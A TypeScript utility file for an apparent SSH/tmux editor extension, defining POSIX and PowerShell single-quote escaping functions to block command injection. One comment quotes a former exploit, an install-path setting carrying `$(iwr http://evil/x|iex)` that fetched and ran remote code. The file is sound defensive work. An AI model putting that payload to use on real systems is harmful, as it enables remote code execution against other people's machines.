// Leaf utility — depends on nothing in the project (see CLAUDE.md `common/*`
// dependency rule). Shared by `src/tmux/tmuxSession.ts` (building tmux command
// lines) and `src/ssh/sshConnection.ts` (quoting `exec`/`execPartial` params)
// so both a hostile workspace path and a hostile task/exec argument are inert
// shell words rather than an injection surface.

/**
 * POSIX single-quote escaping: wrap in `'…'` and rewrite every embedded `'` as
 * `'\''` (close-quote, escaped-quote, reopen-quote). The result is a single
 * shell word with `$`, backticks, `;`, spaces, and newlines all inert.
 */
export function escapeShellArg(value: string): string {
    return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * PowerShell single-quote escaping: wrap in `'…'` and double every embedded `'`.
 * Inside a PowerShell single-quoted string `'` is the *only* special character —
 * `$(…)` subexpressions, `$var`, `"`, backticks, `;` and newlines are all
 * literal — which is what makes this the Windows counterpart of
 * `escapeShellArg`. Used by `src/serverSetup.ts` for every user-configurable
 * value spliced into `src/scripts/server-setup.ps1`: those assignments used to
 * be *double*-quoted, where `$(…)` is evaluated, so e.g.
 * `remote.SSH.serverInstallPath: {"host": "C:\\srv$(iwr http://evil/x|iex)"}`
 * executed attacker code on the remote at connect time.
 */
export function escapePowerShellArg(value: string): string {
    return `'${value.replace(/'/g, `''`)}'`;
}
